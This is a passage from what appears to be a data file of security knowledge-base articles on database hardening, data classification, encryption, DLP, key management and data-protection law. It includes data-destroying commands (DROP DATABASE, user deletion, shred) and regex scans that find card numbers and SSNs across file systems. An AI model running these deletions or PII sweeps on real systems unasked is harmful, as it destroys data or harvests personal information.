-- Revoke public schema access from PUBLIC role (security default change in PG 15)
REVOKE ALL ON DATABASE myapp FROM PUBLIC;
REVOKE ALL ON SCHEMA public FROM PUBLIC;

-- Enable pgaudit for activity logging
-- postgresql.conf:
-- shared_preload_libraries = 'pgaudit'
-- pgaudit.log = 'ddl, role, connection, read, write'
-- pgaudit.log_relation = on
```

## MySQL/MariaDB Hardening

```bash
# Run mysql_secure_installation (interactive hardening script)
mysql_secure_installation

# Manual equivalents:
mysql -u root -p << 'EOF'
-- Remove anonymous users
DELETE FROM mysql.user WHERE User='';

-- Remove remote root login
DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost','127.0.0.1','::1');

-- Remove test database
DROP DATABASE IF EXISTS test;
DELETE FROM mysql.db WHERE Db='test' OR Db='test\\_%';

-- Disable LOAD DATA INFILE (prevents reading arbitrary files)
-- my.cnf: local_infile=0

FLUSH PRIVILEGES;
EOF
```

```sql
-- Create application user with minimal rights
CREATE USER 'appuser'@'10.0.2.%' IDENTIFIED BY 'SecurePass2026!';
GRANT SELECT, INSERT, UPDATE, DELETE ON myapp.* TO 'appuser'@'10.0.2.%';
-- Do NOT grant: SUPER, FILE, PROCESS, SHOW DATABASES, GRANT OPTION

-- Audit: who has SUPER privilege?
SELECT user, host FROM mysql.user WHERE Super_priv = 'Y';

-- Audit: check for wildcard host entries
SELECT user, host FROM mysql.user WHERE host = '%';
```

## Database Audit Logging

```sql
-- SQL Server: enable server audit
USE master;
CREATE SERVER AUDIT CorpAudit
TO FILE (FILEPATH = 'C:\\Audit\\', MAXSIZE = 100MB, MAX_FILES = 10)
WITH (QUEUE_DELAY = 1000, ON_FAILURE = CONTINUE);
ALTER SERVER AUDIT CorpAudit WITH (STATE = ON);

CREATE SERVER AUDIT SPECIFICATION CorpAuditSpec
FOR SERVER AUDIT CorpAudit
ADD (FAILED_LOGIN_GROUP),
ADD (SUCCESSFUL_LOGIN_GROUP),
ADD (DATABASE_PRINCIPAL_IMPERSONATION_GROUP),
ADD (SCHEMA_OBJECT_ACCESS_GROUP);
ALTER SERVER AUDIT SPECIFICATION CorpAuditSpec WITH (STATE = ON);

-- PostgreSQL: log all DDL and role changes (pgaudit)
-- mysql: enable general query log for audit (high volume - use binlog for DML audit)
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/log/mysql/general.log';
```

## Transparent Data Encryption (TDE)

TDE encrypts database files at rest, protecting against physical disk theft or backup theft.

```sql
-- SQL Server TDE
-- Step 1: Create master key
USE master;
CREATE MASTER KEY ENCRYPTION BY PASSWORD = 'MasterKeyPass2026!';

-- Step 2: Create certificate
CREATE CERTIFICATE TDECert WITH SUBJECT = 'TDE Certificate';

-- Step 3: Create database encryption key
USE myapp;
CREATE DATABASE ENCRYPTION KEY
WITH ALGORITHM = AES_256
ENCRYPTION BY SERVER CERTIFICATE TDECert;

-- Step 4: Enable encryption
ALTER DATABASE myapp SET ENCRYPTION ON;

-- Check TDE status
SELECT db.name, dek.encryption_state_desc
FROM sys.databases db
LEFT JOIN sys.dm_database_encryption_keys dek ON db.database_id = dek.database_id;
```

## Least Privilege Access Patterns

```
Application architecture:
+---------------------------+
| App (read/write user)     | -- SELECT, INSERT, UPDATE, DELETE on app tables
+---------------------------+
| Reports (read-only user)  | -- SELECT only on reporting views
+---------------------------+
| DBA (admin user)          | -- DDL, admin ops, audit log access
+---------------------------+
| Backup user               | -- BACKUP DATABASE only
+---------------------------+
| Monitoring user           | -- SELECT on sys tables (performance counters)
+---------------------------+
```

Always:
- One application user per application (no shared credentials)
- Read-only users for reporting/analytics queries
- No application should use the SA/root/postgres superuser
- Rotate database passwords on a schedule and after any suspected compromise
""",
    },
    {
        "title": "Data Classification and Handling — PII, PHI, PCI, and Sensitivity Labels",
        "tags": ["data-classification", "pii", "phi", "pci", "gdpr", "data-security"],
        "content": """# Data Classification and Handling — PII, PHI, PCI, and Sensitivity Labels

## Why Data Classification Matters

You cannot protect data you haven't identified. Data classification is the foundation of DLP, access control, retention policy, and regulatory compliance. Without classification, every byte of data receives the same treatment — either everything is over-protected (expensive) or everything is under-protected (risky).

## Classification Tiers

Most organisations use a 4-tier model:

```
Public     — Information intended for public release
             Examples: marketing materials, press releases, job postings

Internal   — Default for non-public business information
             Examples: internal policies, meeting notes, non-sensitive emails

Confidential — Business-sensitive information with limited distribution
             Examples: financial reports, contracts, HR data, source code

Restricted — Highest sensitivity; regulatory obligation or catastrophic impact if disclosed
             Examples: PII, PHI, PCI data, encryption keys, trade secrets, M&A plans
```

## PII — Personally Identifiable Information

Information that can be used to identify a specific individual, either alone or combined with other data.

**Direct PII (identifies alone):**
- Full name
- Email address
- Phone number
- National ID / SSN / NIN
- Passport number
- Biometric data
- Precise geolocation

**Indirect PII (identifiable in combination):**
- Date of birth + postcode + gender (often uniquely identifies)
- IP address (debated, treated as PII in GDPR)
- Browser fingerprint
- Pseudonymised data with key still accessible

**Handling requirements (GDPR framework):**
```
- Lawful basis required for processing
- Data minimisation: collect only what is necessary
- Purpose limitation: use only for stated purpose
- Storage limitation: delete when no longer needed
- Subject rights: access, rectification, erasure, portability
- Breach notification: 72 hours to supervisory authority
```

## PHI — Protected Health Information

Healthcare data protected under HIPAA (US) and equivalent regulations elsewhere.

**PHI includes 18 HIPAA identifiers:**
- Names, geographic data (smaller than state), dates, phone/fax, email, SSN, medical record numbers, health plan beneficiary numbers, account numbers, certificate/licence numbers, VINs, device identifiers, web URLs, IP addresses, biometric identifiers, full-face photos, unique identifying numbers.

**Technical safeguards required (HIPAA Security Rule):**
```
Access control: Unique user IDs, automatic logoff, encryption
Audit controls: Hardware/software activity records
Integrity: Authenticate ePHI hasn't been altered
Transmission security: Encrypt ePHI in transit
```

## PCI DSS — Payment Card Industry Data Security Standard

Applies to any entity storing, processing, or transmitting cardholder data.

**Cardholder data (CHD) — must be protected:**
- Primary Account Number (PAN) — the 16-digit card number
- Cardholder name
- Service code
- Expiration date

**Sensitive Authentication Data (SAD) — must NEVER be stored post-authorisation:**
- Full magnetic stripe data
- CVV2/CVC2/CAV2 (3-4 digit security code)
- PIN/PIN block

```
PCI DSS scope reduction strategy:
- Tokenisation: Replace PAN with a token that has no value outside the payment system
- Point-to-Point Encryption (P2PE): Encrypt card data at terminal, decrypt only in secure payment processor
  → If neither touches your systems in the clear, your PCI scope shrinks dramatically
```

## Microsoft Purview Sensitivity Labels

Sensitivity labels provide persistent metadata classification that follows data across systems:

```
Label hierarchy:
Public
  Internal
    Confidential
      Confidential / All Employees
      Confidential / Specific Groups
    Restricted
      Restricted / Finance
      Restricted / Legal
```

**Label actions (configurable per label):**
- Encryption (protect even when shared externally)
- Header/footer/watermark (visual markings)
- DLP policy trigger (block external sharing of Restricted content)
- Auto-labelling (apply when patterns like credit card numbers detected)

```powershell
# PowerShell: apply a sensitivity label to a document
# Requires Microsoft Information Protection SDK or AIP client
Set-AIPFileLabel -Path "C:\\Documents\\Q1_Report.docx" \\
    -LabelId "12345678-1234-1234-1234-123456789abc"

# View label on a file
Get-AIPFileStatus -Path "C:\\Documents\\Q1_Report.docx"
```

## Data Discovery and Classification Tools

Before you can classify, you must find sensitive data:

```bash
# grep for PII patterns in files (basic discovery)
# Credit card numbers (Luhn-valid would require further check)
grep -rP "\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\\b" /data/

# US Social Security Numbers
grep -rP "\\b(?!219-09-9999|078-05-1120)(?!666|000|9\\d{2})\\d{3}-(?!00)\\d{2}-(?!0{4})\\d{4}\\b" /data/

# Email addresses
grep -rP "[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,}" /data/

# Tool: Microsoft Purview Data Map (Azure) - scan data stores
# Tool: Varonis - for file share scanning
# Tool: Spirion (IdentityFinder) - endpoint data discovery
# Tool: open-source: pii-detector, presidio (Microsoft)

# Python: presidio for PII detection
from presidio_analyzer import AnalyzerEngine
analyzer = AnalyzerEngine()
results = analyzer.analyze(
    text="My name is John Smith and my email is john@example.com",
    language='en'
)
for result in results:
    print(f"Entity: {result.entity_type}, Score: {result.score}")
```

## Data Retention and Deletion

Classification drives retention schedules:

| Data Type | Retention | Deletion Method |
|-----------|-----------|-----------------|
| PCI transaction records | 1 year minimum (for chargebacks) | Cryptographic erasure or secure wipe |
| GDPR personal data | As long as lawful basis exists | Right to erasure — cryptographic erasure or deletion |
| Security logs | 12 months (PCI DSS 10.7) | Delete after retention |
| Financial records | 7 years (UK Companies Act) | Archival then secure destruction |
| Employee records | Duration of employment + 6 years | Secure shredding / crypto erasure |

**Cryptographic erasure**: Encrypt data with a key, then destroy the key — data becomes unrecoverable without physical destruction.

```bash
# Secure file deletion (overwrite before deletion)
shred -u -n 3 /data/sensitive_file.csv   # Overwrite 3 times then delete

# Crypto shred: OpenSSL encrypt with random key, discard key
openssl enc -aes-256-cbc -in sensitive_data.csv -out /dev/null -k $(openssl rand -hex 32)
# If using full-disk encryption: deleting the encryption key (bitlocker recovery key) achieves crypto erasure

# Windows: BitLocker encrypted drive
# Remove BitLocker key protectors -> data is cryptographically erased without physical destruction
```
""",
    },
    {
        "title": "Encryption at Rest and in Transit — Full Disk, TDE, and TLS",
        "tags": ["encryption", "tls", "full-disk-encryption", "tde", "key-management", "data-security"],
        "content": """# Encryption at Rest and in Transit — Full Disk, TDE, and TLS

## Encryption at Rest

Protects data when it is stored — on disk, in a database, in backups. Prevents an attacker who obtains the physical media from reading the data.

### Full Disk Encryption (FDE)

Encrypts the entire disk volume. The OS and data are encrypted; decryption happens transparently at boot.

**BitLocker (Windows):**
```powershell
# Enable BitLocker on C: drive with TPM and recovery key backup
Enable-BitLocker -MountPoint "C:" \\
    -EncryptionMethod XtsAes256 \\
    -TpmProtector \\
    -UsedSpaceOnly    # Faster on new drives

# Add recovery key protector (back up to AD/Entra ID)
Add-BitLockerKeyProtector -MountPoint "C:" -RecoveryPasswordProtector

# Backup recovery key to Entra ID (modern hybrid join)
BackupToAAD-BitLockerKeyProtector -MountPoint "C:" \\
    -KeyProtectorId ((Get-BitLockerVolume -MountPoint "C:").KeyProtector |
        Where-Object {$_.KeyProtectorType -eq 'RecoveryPassword'}).KeyProtectorId

# Check BitLocker status
Get-BitLockerVolume | Select-Object MountPoint, VolumeStatus, EncryptionPercentage, KeyProtector

# Manage BitLocker at scale via Intune:
# Devices > Configuration Profiles > Endpoint Protection > Windows Encryption
```

**LUKS (Linux):**
```bash
# Encrypt a device with LUKS
cryptsetup luksFormat /dev/sdb --type luks2 --cipher aes-xts-plain64 --key-size 512

# Open (decrypt) the volume
cryptsetup luksOpen /dev/sdb encrypted_data
mkfs.ext4 /dev/mapper/encrypted_data
mount /dev/mapper/encrypted_data /mnt/secure

# Check LUKS header
cryptsetup luksDump /dev/sdb

# /etc/crypttab for auto-mount at boot (prompts for passphrase or uses key file)
# encrypted_data  /dev/sdb  none  luks

# Rotate LUKS key
cryptsetup luksAddKey /dev/sdb          # Add new key
cryptsetup luksRemoveKey /dev/sdb       # Remove old key
```

### Database TDE (see also Database Security article)

TDE encrypts data files and transaction logs. Provides protection when:
- Database backup files are stolen
- Physical server/storage media is removed
- Database files on disk are accessed outside the DB engine

TDE does NOT protect against:
- Authenticated database connections (data is decrypted in memory for queries)
- Attackers with database credentials

### Object/File Level Encryption

For fine-grained control or cross-system sharing:

```python
# Python: AES-GCM file encryption
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os, json

def encrypt_file(plaintext: bytes, key: bytes) -> dict:
    nonce = os.urandom(12)   # 96-bit nonce for AES-GCM
    aesgcm = AESGCM(key)
    ciphertext = aesgcm.encrypt(nonce, plaintext, associated_data=None)
    return {
        "nonce": nonce.hex(),
        "ciphertext": ciphertext.hex(),
        "key_id": "kms://prod-key-2026-01"  # Reference to KMS key
    }

def decrypt_file(encrypted: dict, key: bytes) -> bytes:
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(
        bytes.fromhex(encrypted["nonce"]),
        bytes.fromhex(encrypted["ciphertext"]),
        associated_data=None
    )

# Generate a 256-bit key (in production, use KMS, not local generation)
key = os.urandom(32)
```

## Encryption in Transit — TLS

TLS (Transport Layer Security) encrypts data between two communicating endpoints. TLS 1.3 is the current standard; TLS 1.0 and 1.1 are deprecated.

### TLS Handshake (TLS 1.3)

```
Client                          Server
  |                               |
  |-- ClientHello (TLS 1.3) ----> |  (supported ciphers, key shares)
  |                               |
  |<-- ServerHello -------------- |  (chosen cipher, key share)
  |<-- Certificate -------------- |  (server's certificate)
  |<-- CertificateVerify -------- |  (signature proving private key ownership)
  |<-- Finished ----------------- |
  |                               |
  |-- Finished -----------------> |
  |                               |
  |<====== Encrypted Data ======> |  (symmetric encryption with session key)
```

### TLS Configuration Hardening

```bash
# Nginx: TLS 1.3 only, strong ciphers
# /etc/nginx/conf.d/ssl.conf
server {
    listen 443 ssl http2;
    ssl_certificate     /etc/ssl/certs/server.pem;
    ssl_certificate_key /etc/ssl/private/server.key;

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256;

    # HSTS: force HTTPS for 1 year, include subdomains, preload-eligible
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

    # OCSP Stapling
    ssl_stapling on;
    ssl_stapling_verify on;
    resolver 8.8.8.8 valid=300s;

    # Disable old renegotiation
    ssl_session_tickets off;
    ssl_session_timeout 1d;
    ssl_session_cache shared:SSL:10m;
}

# Test TLS configuration
openssl s_client -connect www.corp.com:443 -tls1_3 -brief
# Or use: https://www.ssllabs.com/ssltest/
# Or: testssl.sh www.corp.com
```

```bash
# Check what TLS versions a server supports
testssl.sh --protocols www.corp.com

# Check for weak ciphers
testssl.sh --cipher-per-proto www.corp.com

# Check certificate chain
openssl s_client -connect www.corp.com:443 -showcerts 2>/dev/null |
    openssl x509 -text -noout | grep -E "Issuer|Subject|Not After"
```

### Mutual TLS (mTLS)

Standard TLS only authenticates the server. mTLS requires both parties to present certificates:

```python
# Python: mTLS client
import httpx, ssl

# Load client certificate and key
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.load_cert_chain('client.crt', 'client.key')
ctx.load_verify_locations('ca.crt')

client = httpx.Client(ssl_context=ctx)
response = client.get("https://internal-api.corp.com/v1/data")
```

```bash
# nginx: require client certificate
ssl_client_certificate /etc/ssl/certs/internal-ca.pem;
ssl_verify_client on;        # Reject connections without valid client cert
# or: ssl_verify_client optional;  # Accept but flag unauthenticated
```

## Key Management

Encryption is only as secure as the key management:

| Bad Practice | Good Practice |
|-------------|---------------|
| Hardcode keys in source code | Store in KMS / Vault |
| Same key for all environments | Separate keys per env (dev/staging/prod) |
| Never rotate keys | Scheduled rotation (annually minimum) |
| Store key alongside ciphertext | Store key separately from data |
| Export key from HSM | Non-exportable HSM keys |

```bash
# AWS KMS: create and use a customer-managed key
# Create key
aws kms create-key --description "Production Data Encryption Key" \\
    --key-usage ENCRYPT_DECRYPT \\
    --key-spec SYMMETRIC_DEFAULT \\
    --multi-region false

KEY_ID=$(aws kms list-keys --query 'Keys[0].KeyId' --output text)

# Encrypt data
aws kms encrypt \\
    --key-id $KEY_ID \\
    --plaintext fileb://plaintext.bin \\
    --output text --query CiphertextBlob | base64 -d > encrypted.bin

# Decrypt
aws kms decrypt \\
    --ciphertext-blob fileb://encrypted.bin \\
    --output text --query Plaintext | base64 -d > decrypted.bin

# Key rotation (automatic annual rotation)
aws kms enable-key-rotation --key-id $KEY_ID
```
""",
    },
    {
        "title": "Data Loss Prevention (DLP) — Policies, Channels, and Alert Triage",
        "tags": ["dlp", "data-loss-prevention", "data-security", "exfiltration", "policy"],
        "content": """# Data Loss Prevention (DLP) — Policies, Channels, and Alert Triage

## What is DLP?

Data Loss Prevention prevents sensitive data from leaving the organisation through unauthorised channels. DLP operates by inspecting content in motion (network), at rest (storage), and in use (endpoints), comparing it against policy rules.

## DLP Components

```
DLP Architecture:
+---------------------------+
|  Policy Engine            |  <- Rules: what is sensitive, what is allowed
+---------------------------+
       |           |
+------+------+ +--+--------+
| Network DLP | | Endpoint  |  <- Where DLP enforces
| (Email, Web)| | DLP       |
+-------------+ +-----------+
       |           |
+---------------------------+
|  Incident Management      |  <- Alerts, triage, reports
+---------------------------+
```

## Data Detection Methods

### Pattern Matching (Regex)

```python
import re

# Credit card number detection (simplified Luhn check would improve accuracy)
CC_PATTERN = re.compile(
    r'\\b(?:4[0-9]{12}(?:[0-9]{3})?'          # Visa
    r'|5[1-5][0-9]{14}'                        # MasterCard
    r'|3[47][0-9]{13}'                         # American Express
    r'|3(?:0[0-5]|[68][0-9])[0-9]{11}'        # Diners Club
    r'|6(?:011|5[0-9]{2})[0-9]{12})\\b'        # Discover
)

# UK National Insurance Number
NIN_UK = re.compile(r'\\b[A-CEGHJ-PR-TW-Z]{1}[A-CEGHJ-NPR-TW-Z]{1}[0-9]{6}[A-D]{1}\\b', re.I)

# IBAN
IBAN = re.compile(r'\\b[A-Z]{2}[0-9]{2}[A-Z0-9]{4}[0-9]{7}([A-Z0-9]?){0,16}\\b')

def scan_for_pii(text: str) -> list:
    findings = []
    for m in CC_PATTERN.finditer(text):
        findings.append({"type": "CREDIT_CARD", "match": m.group(), "pos": m.start()})
    for m in NIN_UK.finditer(text):
        findings.append({"type": "NIN_UK", "match": m.group(), "pos": m.start()})
    return findings
```

### Fingerprinting

Exact data matching: known sensitive documents are hashed in segments. If any segment appears in outbound traffic, it matches — even partially copied content.

### Document Classification (ML)

Trained models classify documents by content (not just patterns): "This is a contract", "This is a source code file", "This contains medical records".

## DLP Channels

| Channel | Detection Point | Common Tool |
|---------|----------------|-------------|
| Email | Mail gateway (MTA) | Microsoft Purview, Proofpoint DLP |
| Web/HTTPS | Proxy / CASB | Zscaler, Symantec DLP, Netskope |
| USB/Removable media | Endpoint agent | Symantec DLP Endpoint, Crowdstrike |
| Cloud sync (OneDrive, Dropbox) | CASB | Microsoft MCAS, Netskope |
| Printing | Endpoint agent | Endpoint DLP |
| Screenshots | Endpoint agent | Advanced endpoint DLP |
| Copy/paste | Endpoint agent | Advanced endpoint DLP |
| API / cloud storage | CASB / cloud DLP | AWS Macie, GCP DLP |

## Microsoft Purview DLP Policy (Example)

```json
// Policy: block external sharing of credit card data
{
  "Name": "Credit Card Protection",
  "Mode": "Enforce",
  "Priority": 1,
  "Rules": [
    {
      "Name": "Block CC external sharing",
      "ContentContainsSensitiveInformation": [
        {
          "Name": "Credit Card Number",
          "MinCount": 1,
          "MinConfidence": 85
        }
      ],
      "ContentPropertyContainsSensitiveInformation": [],
      "RecipientDomainIs": {
        "Exceptions": ["corp.com", "trusted-partner.com"]
      },
      "Actions": [
        {"BlockAccessScope": "EveryoneExceptOwner"},
        {"NotifyUser": {"Recipients": ["SiteAdmin", "LastModifier"]}}
      ],
      "UserNotifications": {
        "Enabled": true,
        "TipText": "This email appears to contain credit card numbers. External sharing has been blocked."
      }
    }
  ]
}
```

## DLP Alert Triage

DLP generates high false-positive volumes without careful tuning. A structured triage approach prevents alert fatigue:

```
DLP Alert Received
       |
       v
Is the sensitive data real?
  - Is it actual PII/PCI or a test number / placeholder?
  - Credit card: run Luhn algorithm check
  - SSN: check against known test patterns (000-xx-xxxx, 9xx-xx-xxxx)
       |
  [Not real data] --> Document as False Positive, tune policy
       |
  [Real data] --> Assess intent
       |
Was this authorised?
  - Was there a business justification? (e.g., finance sending invoice with partial card)
  - Did the user override the DLP tip with a valid reason?
  - Is the destination an approved partner?
       |
  [Authorised] --> Document, close as True Positive / Permitted
  [Unclear] --> Contact user or manager for context
       |
  [Unauthorised / Suspicious] --> Escalate to incident
       |
       v
Incident investigation:
  - Was this accidental (user error) or intentional (insider threat)?
  - What data was involved? How much?
  - Where did it go? Can we recover it?
  - Regulatory breach notification required? (GDPR: within 72h if risk to individuals)
```

## DLP Tuning to Reduce False Positives

```
Common false positive sources:
1. Test data in development environments
   Fix: Exclude dev/test network segments or use data masking in test envs

2. Legitimate business sharing of invoices, contracts
   Fix: Add partner domain exceptions to policy

3. Internal security team sharing IOCs (containing card-like patterns)
   Fix: Whitelist security team accounts/groups

4. Training materials with example PII
   Fix: Label training documents as Public/Internal and exclude from strict rules

5. Legacy applications using card numbers in log files
   Fix: Fix the application; add temporary location exclusion while fixing

Metrics to track DLP policy health:
- False positive rate per rule (target < 5%)
- Incident escalation rate (DLP events that become real incidents)
- User override rate (high = overly aggressive policy or poor UX)
- Coverage: % of email/web/endpoint traffic inspected
```

## Cloud DLP with AWS Macie

```bash
# Enable Macie
aws macie2 enable-macie

# Create classification job to scan an S3 bucket
aws macie2 create-classification-job \\
    --name "PII-Scan-DataBucket" \\
    --job-type ONE_TIME \\
    --s3-job-definition '{
        "bucketDefinitions": [{
            "accountId": "123456789",
            "buckets": ["company-data-bucket"]
        }]
    }'

# Check findings
aws macie2 list-findings \\
    --finding-criteria '{
        "criterion": {
            "severity.score": {"gte": 50}
        }
    }'

# Macie detects: SSNs, credit cards, AWS secret keys, passwords, auth tokens
# in S3 objects — unstructured and structured data
```
""",
    },
    {
        "title": "Key Management — HSMs, KMS, and Key Rotation Practices",
        "tags": ["key-management", "hsm", "kms", "encryption", "cryptography", "data-security"],
        "content": """# Key Management — HSMs, KMS, and Key Rotation Practices

## The Key Management Problem

Encryption is only as strong as key management. An encryption key stored in the same place as the ciphertext it protects provides no real security — anyone who accesses the data location also accesses the key.

**Key management must address:**
- Key generation (entropy, algorithm, length)
- Key storage (where and how securely)
- Key distribution (how keys reach systems that need them)
- Key rotation (how often keys change)
- Key revocation (how to retire a compromised key)
- Key destruction (how to securely delete keys)
- Key access control (who can use which key for what purpose)

## Hardware Security Modules (HSMs)

An HSM is a tamper-resistant hardware device that generates, stores, and performs cryptographic operations with keys that never leave the device in plaintext.

```
Application  <-- API call: "Encrypt this data with key X" -->  HSM
                           HSM performs encryption inside,
                           returns ciphertext only.
                           Key X never leaves the HSM.
```

**Physical security features:**
- Tamper-evident casing (visible evidence of physical intrusion)
- Tamper-responsive (zeroise keys on intrusion detection)
- Environmental attack resistance (voltage, temperature, radiation)
- FIPS 140-2 Level 3/4 certification (highest levels)

**Use cases:**
- Root CA private key storage (offline HSM)
- Database TDE master key storage
- Payment terminal key management (PCI HSM)
- Code signing key protection
- TLS private key protection for high-value services

```bash
# AWS CloudHSM: AWS-managed HSM cluster
aws cloudhsm create-cluster \\
    --hsm-type hsm1.medium \\
    --subnet-ids subnet-xxxxxxxx

# Use CloudHSM with PKCS#11 library
# pkcs11-tool --module /opt/cloudhsm/lib/libcloudhsm_pkcs11.so \\
#     --list-objects --type privkey

# Thales/nCipher local HSM (PKCS#11)
pkcs11-tool --module /usr/lib/libCryptoki2_64.so --list-slots
```

## Cloud Key Management Services

### AWS KMS

```bash
# Create a Customer Managed Key (CMK)
aws kms create-key \\
    --description "Application data encryption key" \\
    --key-usage ENCRYPT_DECRYPT \\
    --key-spec SYMMETRIC_DEFAULT \\
    --origin AWS_KMS               # KMS generates key material
    # or --origin EXTERNAL          # You import your own key material

KEY_ID=$(aws kms list-keys --query 'Keys[0].KeyId' --output text)

# Create an alias for the key
aws kms create-alias --alias-name alias/prod-app-key --target-key-id $KEY_ID

# Enable automatic annual rotation
aws kms enable-key-rotation --key-id $KEY_ID

# Encrypt
aws kms encrypt --key-id alias/prod-app-key \\
    --plaintext fileb://secret.txt \\
    --output text --query CiphertextBlob | base64 -d > secret.enc

# Decrypt (KMS knows which key to use from ciphertext metadata)
aws kms decrypt --ciphertext-blob fileb://secret.enc \\
    --output text --query Plaintext | base64 -d

# Key policy: restrict who can use the key
aws kms put-key-policy --key-id $KEY_ID --policy-name default \\
    --policy '{
        "Version": "2012-10-17",
        "Statement": [{
            "Effect": "Allow",
            "Principal": {"AWS": "arn:aws:iam::123456789:role/app-role"},
            "Action": ["kms:Decrypt", "kms:GenerateDataKey"],
            "Resource": "*"
        }]
    }'
```

### HashiCorp Vault

```bash
# Start Vault dev server (testing only)
vault server -dev

# Production: initialise and unseal
vault operator init -key-shares=5 -key-threshold=3  # 5 keys, 3 needed to unseal
vault operator unseal <unseal_key_1>
vault operator unseal <unseal_key_2>
vault operator unseal <unseal_key_3>

# Enable the transit secrets engine (encryption as a service)
vault secrets enable transit
vault write transit/keys/app-key type=aes256-gcm96

# Encrypt
vault write transit/encrypt/app-key plaintext=$(base64 <<< "sensitive data")
# Returns: ciphertext vault:v1:xxxxxx

# Decrypt
vault write transit/decrypt/app-key ciphertext="vault:v1:xxxxxx"

# Rotate the key (new version; old ciphertext still decryptable)
vault write transit/keys/app-key/rotate

# Re-wrap all ciphertexts to latest key version
vault write transit/rewrap/app-key ciphertext="vault:v1:xxxxxx"
```

## Key Rotation Practices

Key rotation limits the blast radius of a compromise — if a key is leaked, only data encrypted with that key version is at risk.

### When to Rotate

| Key Type | Rotation Frequency | Trigger for Immediate Rotation |
|---------|-------------------|-------------------------------|
| Symmetric data encryption | Annually | Suspected compromise, personnel change |
| TLS certificate private key | At renewal (1-2 years) | Certificate revoked, private key exposed |
| API keys / tokens | 90 days | Suspected exposure, employee departure |
| Database master key | Annually | DBA account compromise |
| Root CA key | Rarely (10-20 years) | Compromise (catastrophic) |
| JWT signing key | 1-6 months | Compromise |

### Envelope Encryption

Don't use the same key to encrypt all data — use envelope encryption to separate key management from bulk encryption:

```
Key Encryption Key (KEK)  <-- stored in KMS/HSM
    |
    +-- encrypts --> Data Encryption Key (DEK)  <-- generated per file/object
                          |
                          +-- encrypts --> Actual Data

Rotation: Rotate KEK -> re-encrypt all DEKs (cheap)
          No need to re-encrypt all data
```

```python
# Envelope encryption example with AWS KMS
import boto3, os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

kms = boto3.client('kms', region_name='eu-west-1')
KEY_ID = "alias/prod-app-key"

def encrypt_data(plaintext: bytes) -> dict:
    # KMS generates a data key: plaintext (for encryption) + encrypted copy (for storage)
    response = kms.generate_data_key(KeyId=KEY_ID, KeySpec='AES_256')
    dek_plaintext  = response['Plaintext']        # 32-byte AES key
    dek_ciphertext = response['CiphertextBlob']   # Encrypted DEK to store with data

    # Encrypt data with DEK
    nonce = os.urandom(12)
    ciphertext = AESGCM(dek_plaintext).encrypt(nonce, plaintext, None)

    # Wipe DEK from memory (best effort in Python)
    dek_plaintext = b'\\x00' * 32

    return {
        'encrypted_dek': dek_ciphertext.hex(),
        'nonce': nonce.hex(),
        'ciphertext': ciphertext.hex(),
    }

def decrypt_data(envelope: dict) -> bytes:
    # Decrypt the DEK using KMS
    response = kms.decrypt(
        CiphertextBlob=bytes.fromhex(envelope['encrypted_dek'])
    )
    dek = response['Plaintext']
    return AESGCM(dek).decrypt(bytes.fromhex(envelope['nonce']),
                               bytes.fromhex(envelope['ciphertext']), None)
```

## Key Management Security Controls

```
Access control:
[ ] Key access logged and audited (every encrypt/decrypt operation)
[ ] Separation of duties: key admins cannot use keys; key users cannot manage keys
[ ] MFA required for key admin operations
[ ] Key usage restricted by IAM policy (only specific roles/services can use each key)

Key security:
[ ] Root/master keys stored in HSM or managed KMS
[ ] Key material never exported from HSM in plaintext
[ ] Envelope encryption used for bulk data
[ ] Key escrow/backup copies held in separate secure location

Operational:
[ ] Key inventory maintained (purpose, owner, rotation date, expiry)
[ ] Automated rotation reminders and workflows
[ ] Rotation testing performed in non-production before production rotation
[ ] Incident playbook: what to do if a key is compromised
```
""",
    },
    {
        "title": "GDPR, HIPAA, PCI-DSS — Data Protection Requirements Comparison",
        "tags": ["gdpr", "hipaa", "pci-dss", "compliance", "data-protection", "regulations"],
        "content": """# GDPR, HIPAA, PCI-DSS — Data Protection Requirements Comparison

## Three Frameworks, One Goal

GDPR, HIPAA, and PCI-DSS are the three most impactful data protection regulations for most organisations. Despite different contexts (EU personal data, US healthcare, global payments), they share common security themes: access control, encryption, audit logging, breach notification, and accountability.

## GDPR — General Data Protection Regulation

**Scope:** Any organisation processing personal data of EU/EEA residents, regardless of where the organisation is located.

**Key rights and principles:**
```
Data Subject Rights:
- Right to access (Subject Access Request — must respond within 1 month)
- Right to rectification (correct inaccurate data)
- Right to erasure ("right to be forgotten")
- Right to data portability (receive data in machine-readable format)
- Right to object (to processing, to profiling)
- Rights related to automated decision-making

Data Controller Obligations:
- Lawful basis for processing (consent, contract, legitimate interest, legal obligation...)
- Data minimisation (collect only what's necessary)
- Purpose limitation (don't use data for other purposes)
- Storage limitation (delete when no longer needed)
- Accuracy (keep data correct)
- Security (appropriate technical and organisational measures)
```

**Technical requirements:**
| Requirement | Implementation |
|-------------|----------------|
| Access control | RBAC, MFA for systems handling PII |
| Encryption | TLS in transit; encryption at rest for sensitive PII |
| Pseudonymisation | Replace direct identifiers with tokens |
| Audit logging | Log all access to personal data |
| Privacy by design | Build privacy controls into system design from the start |
| DPIA (Data Protection Impact Assessment) | Required for high-risk processing |

**Breach notification:**
```
If a breach is likely to result in risk to individuals' rights:
  --> Notify supervisory authority within 72 hours
  --> Notify individuals if high risk to their rights (no undue delay)

"Risk to individuals" = risk of discrimination, identity theft,
financial loss, damage to reputation, physical harm, etc.
```

**Penalties:** Up to €20 million or 4% of global annual turnover (whichever is higher).

## HIPAA — Health Insurance Portability and Accountability Act

**Scope:** US-based covered entities (healthcare providers, health plans, healthcare clearinghouses) and their business associates.

**PHI (Protected Health Information):** Any health information linked to an individual — electronic (ePHI), paper, or oral.

**HIPAA Rules:**
- **Privacy Rule** — Controls over disclosure and use of PHI (minimum necessary standard)
